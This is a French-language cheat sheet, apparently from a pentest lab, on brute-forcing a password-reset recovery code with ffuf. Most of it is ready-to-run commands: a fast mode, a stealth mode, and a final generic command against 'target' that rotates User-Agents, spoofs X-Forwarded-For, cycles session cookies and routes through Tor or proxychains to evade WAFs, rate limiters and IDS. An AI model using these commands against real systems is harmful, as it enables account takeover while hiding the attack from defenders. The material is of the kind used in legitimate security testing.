#"🧠 Contournement de blocages lors de brute-force avec ffuf

Quand tu testes un champ sensible (ex: recovery_code) en POST via ffuf, il est fréquent que le serveur mette en place des protections anti-brute-force. Voici les techniques de contournement à connaître, illustrées avec deux approches :
💥 Mode rapide (agressif, + détectable)
```bash
ffuf -w code.txt \
  -u "http://10.10.182.202:1337/reset_password.php" \
  -X POST \
  -d "recovery_code=FUZZ&s=60" \
  -H "Cookie: PHPSESSID=77hof0vkqdqphapa434ddln1q6" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -t 5
```

##🔹 Avantages :

    Rapide

    Simple pour premiers tests

##🔹 Inconvénients :

    Peut être bloqué par WAF, rate limiter ou système de détection

#🐢 Mode furtif (lenteur contrôlée)
```bash
ffuf -w count-9999.txt \
  -u "http://10.10.182.202:1337/reset_password.php" \
  -X POST \
  -d "recovery_code=FUZZ&s=80" \
  -b "PHPSESSID=sg768n6m11nkob78lpkhlqo6h6" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -fr "Invalid" -fw 1 \
  -p 2 \
  -t 1 \
  --timeout 10 \
  -o slow_output.txt
```
##🔹 Avantages :

    Moins visible pour les IDS/WAF

    Permet d'éviter le blocage via ralentissement

##🔹 Inconvénients :

    Beaucoup plus lent

    Nécessite de filtrer correctement les réponses

#🧩 Techniques générales de contournement

| Technique                            | Explication                                  | Exemple                               |
|--------------------------------------|----------------------------------------------|---------------------------------------|
| `🐌 Ralenti`                         | `Pause entre requêtes pour éviter détection` | -p 2                                  |
| `🔁 Thread `                         | `unique	Réduit la charge visible`           | -t 1                                  |
| `🎭 Rotation UA/IP`                  | `Dissimule la source`                        | -H "User-Agent: ...", X-Forwarded-For |
| `🍪 Session dynamique`               | `Change la session utilisateur`              | -b "PHPSESSID=FUZZ" + wordlist        |
| `🔃 Paramètres dynamiques`           | `Change les valeurs annexes`                 | s=RANDOM, token=FUZZ                  |
| `🧼 Nettoyage de réponses`           | `Ignore les erreurs ou bruit`                | -fr, -fw, -fc                         |
| `🌐 Proxy`                           | `Utilise proxy ou Tor`                       | proxychains ffuf                      |

```bash
ffuf -w codes.txt \
  -u "http://target/reset_password.php" \
  -X POST \
  -d "recovery_code=FUZZ&ts=$(date +%s)" \
  -b "PHPSESSID=FUZZ" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "User-Agent: $(shuf -n1 useragents.txt)" \
  -H "X-Forwarded-For: $(shuf -n1 ips.txt)" \
  -fr "Invalid" -t 1 -p 1 \
  --timeout 10
```